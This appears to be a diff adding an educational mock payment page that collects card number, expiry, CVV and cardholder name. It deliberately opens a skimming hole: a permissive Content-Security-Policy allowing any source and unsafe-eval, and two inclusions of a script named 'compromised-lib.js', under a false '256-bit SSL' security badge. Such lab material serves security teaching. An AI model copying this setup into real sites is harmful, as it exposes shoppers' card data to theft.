@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+  <title>SecureCheck Pro | Payment Portal</title>
+  <script src="/compromised-lib.js"></script>
+  <style>
+    /* Global Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    /* Main Container */
+    .checkout-container {
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 480px;
+      overflow: hidden;
+      animation: fadeIn 0.8s ease-out;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    /* Header */
+    .checkout-header {
+      background: linear-gradient(90deg, #1a2980, #26d0ce);
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+    
+    .logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+    
+    .logo-icon {
+      background: white;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #1a2980;
+      font-weight: bold;
+      font-size: 20px;
+    }
+    
+    .checkout-header h1 {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      letter-spacing: -0.5px;
+    }
+    
+    .checkout-header p {
+      opacity: 0.9;
+      font-size: 14px;
+    }
+    
+    /* Form Styling */
+    .checkout-form {
+      padding: 40px;
+    }
+    
+    .form-group {
+      margin-bottom: 25px;
+      position: relative;
+    }
+    
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 600;
+      color: #333;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    .input-with-icon {
+      position: relative;
+    }
+    
+    .input-icon {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #667eea;
+      font-size: 18px;
+    }
+    
+    .form-group input {
+      width: 100%;
+      padding: 16px 16px 16px 45px;
+      border: 2px solid #e1e5e9;
+      border-radius: 10px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: #f8f9fa;
+      color: #333;
+    }
+    
+    .form-group input:focus {
+      outline: none;
+      border-color: #667eea;
+      background: white;
+      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+    
+    .form-group input::placeholder {
+      color: #a0aec0;
+    }
+    
+    /* Card Row */
+    .card-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 20px;
+    }
+    
+    /* Security Badge */
+    .security-badge {
+      background: #f0f7ff;
+      border: 2px dashed #c3dafe;
+      border-radius: 10px;
+      padding: 15px;
+      margin: 25px 0;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    
+    .security-icon {
+      color: #48bb78;
+      font-size: 24px;
+    }
+    
+    .security-text h4 {
+      color: #2d3748;
+      margin-bottom: 4px;
+      font-size: 14px;
+    }
+    
+    .security-text p {
+      color: #718096;
+      font-size: 12px;
+      line-height: 1.4;
+    }
+    
+    /* Submit Button */
+    .submit-btn {
+      width: 100%;
+      background: linear-gradient(90deg, #1a2980, #26d0ce);
+      color: white;
+      border: none;
+      padding: 18px;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .submit-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(26, 41, 128, 0.3);
+    }
+    
+    .submit-btn:active {
+      transform: translateY(0);
+    }
+    
+    .btn-icon {
+      font-size: 20px;
+    }
+    
+    /* Payment Methods */
+    .payment-methods {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 25px;
+      padding-top: 25px;
+      border-top: 1px solid #e2e8f0;
+    }
+    
+    .payment-icon {
+      width: 40px;
+      height: 40px;
+      background: #f7fafc;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #4a5568;
+      font-size: 20px;
+      transition: all 0.3s ease;
+    }
+    
+    .payment-icon:hover {
+      background: #667eea;
+      color: white;
+      transform: translateY(-3px);
+    }
+    
+    /* Footer */
+    .checkout-footer {
+      background: #f8f9fa;
+      padding: 20px;
+      text-align: center;
+      border-top: 1px solid #e2e8f0;
+    }
+    
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin-bottom: 15px;
+    }
+    
+    .footer-links a {
+      color: #667eea;
+      text-decoration: none;
+      font-size: 13px;
+      transition: color 0.3s ease;
+    }
+    
+    .footer-links a:hover {
+      color: #1a2980;
+      text-decoration: underline;
+    }
+    
+    .copyright {
+      color: #718096;
+      font-size: 12px;
+    }
+    
+    /* Hidden Testing Notice */
+    .testing-notice {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: rgba(255, 193, 7, 0.95);
+      color: #333;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 12px;
+      max-width: 300px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+      z-index: 1000;
+      border-left: 4px solid #ff5722;
+    }
+    
+    .testing-notice h4 {
+      color: #d32f2f;
+      margin-bottom: 5px;
+      font-size: 14px;
+    }
+    
+    /* Responsive */
+    @media (max-width: 576px) {
+      .checkout-form {
+        padding: 30px 20px;
+      }
+      
+      .card-row {
+        grid-template-columns: 1fr;
+        gap: 15px;
+      }
+      
+      .checkout-header h1 {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Hidden Testing Notice -->
+  <div class="testing-notice">
+    <h4>⚠️ EDUCATIONAL TESTING ONLY</h4>
+    <p>This is a simulated checkout page for security education. Use test data only.</p>
+  </div>
+
+  <div class="checkout-container">
+    <!-- Header -->
+    <div class="checkout-header">
+      <div class="logo">
+        <div class="logo-icon">✓</div>
+        <h1>SecureCheck Pro</h1>
+      </div>
+      <p>Complete your payment securely</p>
+    </div>
+
+    <!-- Form -->
+    <form id="checkout" class="checkout-form">
+      <!-- Card Number -->
+      <div class="form-group">
+        <label for="card_number">CARD NUMBER</label>
+        <div class="input-with-icon">
+          <div class="input-icon">💳</div>
+          <input type="text" 
+                 name="card_number" 
+                 id="card_number" 
+                 placeholder="1234 5678 9012 3456"
+                 maxlength="19"
+                 pattern="[0-9\s]{13,19}"
+                 required>
+        </div>
+      </div>
+
+      <!-- Expiry & CVV -->
+      <div class="card-row">
+        <div class="form-group">
+          <label for="expiry">EXPIRY DATE</label>
+          <div class="input-with-icon">
+            <div class="input-icon">📅</div>
+            <input type="text" 
+                   name="expiry" 
+                   id="expiry" 
+                   placeholder="MM/YY"
+                   pattern="\d{2}/\d{2}"
+                   required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="cvv">SECURITY CODE</label>
+          <div class="input-with-icon">
+            <div class="input-icon">🔒</div>
+            <input type="password" 
+                   name="cvv" 
+                   id="cvv" 
+                   placeholder="123"
+                   maxlength="4"
+                   pattern="\d{3,4}"
+                   required>
+          </div>
+        </div>
+      </div>
+
+      <!-- Cardholder Name -->
+      <div class="form-group">
+        <label for="cardholder">CARDHOLDER NAME</label>
+        <div class="input-with-icon">
+          <div class="input-icon">👤</div>
+          <input type="text" 
+                 name="cardholder" 
+                 id="cardholder" 
+                 placeholder="As shown on card"
+                 required>
+        </div>
+      </div>
+
+      <!-- Security Badge -->
+      <div class="security-badge">
+        <div class="security-icon">🔐</div>
+        <div class="security-text">
+          <h4>Secure SSL Encryption</h4>
+          <p>Your payment details are protected with 256-bit SSL encryption</p>
+        </div>
+      </div>
+
+      <!-- Submit Button -->
+      <button type="submit" class="submit-btn">
+        <span class="btn-icon">💳</span>
+        PAY $189.99
+      </button>
+
+      <!-- Payment Methods -->
+      <div class="payment-methods">
+        <div class="payment-icon">💳</div>
+        <div class="payment-icon">🔵</div>
+        <div class="payment-icon">🟡</div>
+        <div class="payment-icon">◯</div>
+      </div>
+    </form>
+
+    <!-- Footer -->
+    <div class="checkout-footer">
+      <div class="footer-links">
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Refund Policy</a>
+        <a href="#">Contact Support</a>
+      </div>
+      <p class="copyright">© 2024 SecureCheck Pro. All rights reserved.</p>
+    </div>
+  </div>
+
+  <!-- Original scripts -->
+  <script src="/compromised-lib.js"></script>
+  <script src="/js/main.js"></script>
+</body>
+</html>
